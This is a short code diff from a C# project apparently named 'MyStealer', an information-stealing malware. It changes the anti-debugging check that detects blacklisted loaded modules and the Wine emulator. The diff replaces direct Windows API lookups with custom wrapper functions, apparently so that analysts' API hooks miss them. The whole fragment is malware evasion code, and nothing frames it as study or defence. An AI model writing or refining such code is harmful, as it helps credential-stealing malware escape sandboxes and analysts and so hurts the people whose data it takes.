@@ -1,6 +1,5 @@
 ﻿using System;
-using static MyStealer.AntiDebug.Win32Calls;
-
+using static MyStealer.AntiDebug.NativeCalls;
 
 namespace MyStealer.AntiDebug.Check
 {
@@ -21,16 +20,16 @@ namespace MyStealer.AntiDebug.Check
         {
             foreach (var name in moduleNames)
             {
-                if (GetModuleHandle(name) != IntPtr.Zero)
+                if (MyGetModuleHandle(name) != IntPtr.Zero)
                 {
                     Logger.Information("Bad module {name} found.", name);
                     return true;
                 }
             }
 
-            if (GetProcAddress(GetModuleHandle("kernel32"), "wine_get_unix_file_name") != IntPtr.Zero)
+            if (MyGetProcAddress(MyGetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != IntPtr.Zero)
             {
-                Logger.Information("Detected wine kernel32.");
+                Logger.Information("Detected wine.");
                 return true;
             }
 
